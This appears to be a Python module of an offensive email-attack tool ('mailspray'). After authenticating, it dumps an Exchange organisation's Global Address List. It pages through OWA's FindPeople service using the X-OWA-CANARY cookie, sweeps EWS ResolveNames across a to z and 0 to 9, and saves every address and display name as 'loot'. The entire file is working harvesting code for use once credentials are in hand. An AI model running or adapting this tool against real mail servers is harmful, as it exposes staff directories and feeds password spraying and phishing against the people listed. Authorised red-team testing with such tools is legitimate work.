"""gal — dump the Global Address List (directory) from Exchange.

Two post-auth paths, chosen by protocol:
  * owa  — warm up an authenticated GET /owa/ to obtain the X-OWA-CANARY cookie,
           then POST /owa/service.svc?action=FindPeople against the "directory"
           folder (MailSniper technique). Paged via IndexedPageItemView.
  * ews  — POST ResolveNames (ReturnFullContactData) over an a..z0..9 sweep,
           Basic auth, preferring SMTP addresses over legacy X500 DNs.

Options (-O KEY=VAL):
  prefix=smith       single query term instead of the full sweep
  max=500            stop after N unique entries (default: unlimited)
  out=/tmp/gal.txt   also write "email<TAB>displayName" lines to a file
"""

import json
import string
import xml.etree.ElementTree as ET
from xml.sax.saxutils import escape

from mailspray.core.module import BaseMSModule

_T = "{http://schemas.microsoft.com/exchange/services/2006/types}"
_OWA_PAGE = 100
_FINDPEOPLE_ACTION = "FindPeople"
_EWS_RESOLVE_CAP = 100  # ResolveNames returns at most 100 candidates per query

_RESOLVENAMES_SOAP = """<?xml version="1.0" encoding="utf-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types">
  <soap:Header>
    <t:RequestServerVersion Version="Exchange2013"/>
  </soap:Header>
  <soap:Body>
    <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
      <m:UnresolvedEntry>{entry}</m:UnresolvedEntry>
    </m:ResolveNames>
  </soap:Body>
</soap:Envelope>"""
_RESOLVENAMES_SOAPACTION = (
    "http://schemas.microsoft.com/exchange/services/2006/messages/ResolveNames"
)


class GalModule(BaseMSModule):
    name = "gal"
    description = "Dump the Global Address List (OWA FindPeople / EWS ResolveNames)"
    supported_protocols = ["owa", "ews"]
    opts_help = {
        "prefix": "Single query term instead of the a..z0..9 sweep",
        "max": "Stop after N unique entries (default: unlimited)",
        "out": "Also write email<TAB>displayName lines to this file",
    }

    def options(self, opts):
        self.opts = dict(opts or {})
        self.prefix = self.opts.get("prefix")
        self.max_entries = int(self.opts["max"]) if str(self.opts.get("max", "")).isdigit() else 0
        self.out = self.opts.get("out")

    # ── OWA FindPeople ──────────────────────────────────────────────

    @staticmethod
    def _owa_canary(session):
        for c in session.cookies:
            if c.name.lower() == "x-owa-canary":
                return c.value
        return None

    def _findpeople_body(self, offset, query):
        return {
            "__type": "FindPeopleJsonRequest:#Exchange",
            "Header": {
                "__type": "JsonRequestHeaders:#Exchange",
                "RequestServerVersion": "Exchange2013",
            },
            "Body": {
                "__type": "FindPeopleRequest:#Exchange",
                "IndexedPageItemView": {
                    "__type": "IndexedPageView:#Exchange",
                    "BasePoint": "Beginning",
                    "Offset": offset,
                    "MaxEntriesReturned": _OWA_PAGE,
                },
                "QueryString": query,
                "ParentFolderId": {
                    "__type": "TargetFolderId:#Exchange",
                    "BaseFolderId": {
                        "__type": "DistinguishedFolderId:#Exchange",
                        "Id": "directory",
                    },
                },
                "PersonaShape": {
                    "__type": "PersonaResponseShape:#Exchange",
                    "BaseShape": "Default",
                },
                "ShouldResolveOneOffEmailAddress": False,
            },
        }

    @staticmethod
    def _parse_findpeople(obj):
        """Return (entries[(email, name)], total_in_view, persona_count)."""
        out = []
        body = (obj or {}).get("Body") or {}
        personas = body.get("ResultSet") or []
        for persona in personas:
            if not isinstance(persona, dict):
                continue
            name = persona.get("DisplayName") or ""
            got = False
            for e in persona.get("EmailAddresses") or []:
                addr = e.get("EmailAddress") if isinstance(e, dict) else None
                if addr:
                    out.append((addr, name))
                    got = True
            if not got:
                single = persona.get("EmailAddress")
                if isinstance(single, dict):
                    single = single.get("EmailAddress")
                if single:
                    out.append((single, name))
        return out, body.get("TotalNumberOfPeopleInView"), len(personas)

    def _run_owa(self, ctx, session):
        base = ctx.base_url or f"https://{ctx.host}"
        # Warm-up: an authenticated GET /owa/ is what sets the X-OWA-CANARY cookie
        # (the logon POST alone does not). Also confirms the session is really authed.
        try:
            session.get(f"{base}/owa/", timeout=ctx.timeout, allow_redirects=True)
        except Exception:
            pass
        canary = self._owa_canary(session)
        if not canary:
            ctx.log_warn("gal(owa): no X-OWA-CANARY cookie after /owa/ load — session may "
                         "not be fully authenticated; FindPeople is likely to be rejected")

        url = f"{base}/owa/service.svc?action={_FINDPEOPLE_ACTION}"
        headers = {
            "Content-Type": "application/json; charset=utf-8",
            "Accept": "application/json; charset=utf-8",
            "Action": _FINDPEOPLE_ACTION,
            "X-Requested-With": "XMLHttpRequest",
        }
        if canary:
            headers["X-OWA-CANARY"] = canary

        query = self.prefix  # None = full directory
        offset = 0
        seen = {}
        while True:
            payload = json.dumps(self._findpeople_body(offset, query))
            try:
                r = session.post(url, data=payload, headers=headers,
                                 timeout=ctx.timeout, allow_redirects=False)
            except Exception as e:
                ctx.log_warn(f"gal(owa): request failed: {e}")
                break
            if r.status_code != 200:
                ctx.log_warn(f"gal(owa): HTTP {r.status_code} from FindPeople")
                break
            try:
                data = r.json()
            except Exception:
                ctx.log_warn("gal(owa): non-JSON response from FindPeople")
                break

            entries, total, personas = self._parse_findpeople(data)
            for addr, name in entries:
                self._record(ctx, seen, addr, name)
                if self.max_entries and len(seen) >= self.max_entries:
                    break

            if self.max_entries and len(seen) >= self.max_entries:
                break
            if personas == 0 or personas < _OWA_PAGE:
                break               # last page (page by PERSONA count, not email count)
            offset += personas
            if total and offset >= total:
                break

        self._finish(ctx, seen)

    # ── EWS ResolveNames ────────────────────────────────────────────

    @staticmethod
    def _resolution_email(res):
        """Prefer an SMTP address; fall back to a Contact SMTP entry; skip pure X500 DNs."""
        mb = res.find(f"{_T}Mailbox")
        name = (mb.findtext(f"{_T}Name") if mb is not None else "") or ""
        routing = (mb.findtext(f"{_T}RoutingType") if mb is not None else "") or ""
        addr = mb.findtext(f"{_T}EmailAddress") if mb is not None else None

        if addr and routing.upper() == "SMTP":
            return addr, name

        # RoutingType EX (or unknown): the Mailbox address is a legacy DN. Look for
        # an SMTP address in the Contact returned by ReturnFullContactData.
        contact = res.find(f"{_T}Contact")
        if contact is not None:
            for entry in contact.iter(f"{_T}Entry"):
                t = (entry.text or "").strip()
                val = t.split(":", 1)[1] if t.lower().startswith("smtp:") else t
                if "@" in val:
                    return val, name

        if addr and "@" in addr and not addr.startswith("/"):
            return addr, name  # some servers omit RoutingType but give a real SMTP addr
        return None, name

    @classmethod
    def _parse_resolvenames(cls, xml_text):
        """Extract [(email, name)] from a ResolveNames SOAP response."""
        out = []
        try:
            root = ET.fromstring(xml_text)
        except Exception:
            return out
        for res in root.iter(f"{_T}Resolution"):
            addr, name = cls._resolution_email(res)
            if addr:
                out.append((addr, name or ""))
        return out

    def _run_ews(self, ctx, handle):
        if self.prefix:
            terms = [self.prefix]
        else:
            terms = list(string.ascii_lowercase) + list(string.digits)
        seen = {}
        for term in terms:
            body = _RESOLVENAMES_SOAP.format(entry=escape(term))
            try:
                r = handle.post_soap(body, _RESOLVENAMES_SOAPACTION)
            except Exception as e:
                ctx.log_warn(f"gal(ews): query {term!r} failed: {e}")
                continue
            if r.status_code != 200:
                continue
            entries = self._parse_resolvenames(r.text)
            for addr, name in entries:
                self._record(ctx, seen, addr, name)
            if len(entries) >= _EWS_RESOLVE_CAP:
                ctx.log_warn(f"gal(ews): term {term!r} hit the {_EWS_RESOLVE_CAP}-result "
                             f"ResolveNames cap — directory may be truncated; narrow with -O prefix=")
            if self.max_entries and len(seen) >= self.max_entries:
                break
        self._finish(ctx, seen)

    # ── shared ──────────────────────────────────────────────────────

    def _record(self, ctx, seen, addr, name):
        key = addr.lower().strip()
        if not key or key in seen:
            return False
        seen[key] = (addr, name)
        ctx.emit_loot("gal", addr, name, source="global-address-list")
        return True

    def _finish(self, ctx, seen):
        ctx.log_info(f"gal: {len(seen)} unique address(es) collected")
        if self.out and seen:
            self._dump(ctx, seen)

    def _dump(self, ctx, seen):
        try:
            from mailspray.cli import resolve_credential_output_path, REPO_ROOT, ensure_parent_dir
            path, err = resolve_credential_output_path(self.out, REPO_ROOT)
            if err:
                ctx.log_warn(f"gal: -O out rejected: {err}")
                return
            ensure_parent_dir(path)
            with open(path, "a") as f:
                for addr, name in sorted(seen.values()):
                    f.write(f"{addr}\t{name}\n")
            ctx.log_info(f"gal: wrote {len(seen)} address(es) to {path}")
        except Exception as e:
            ctx.log_warn(f"gal: failed to write out file: {e}")

    # ── entry point ─────────────────────────────────────────────────

    def on_auth(self, ctx, handle):
        if ctx.protocol == "owa":
            self._run_owa(ctx, handle)
        elif ctx.protocol == "ews":
            self._run_ews(ctx, handle)
        else:
            ctx.log_warn(f"gal: unsupported protocol {ctx.protocol}")
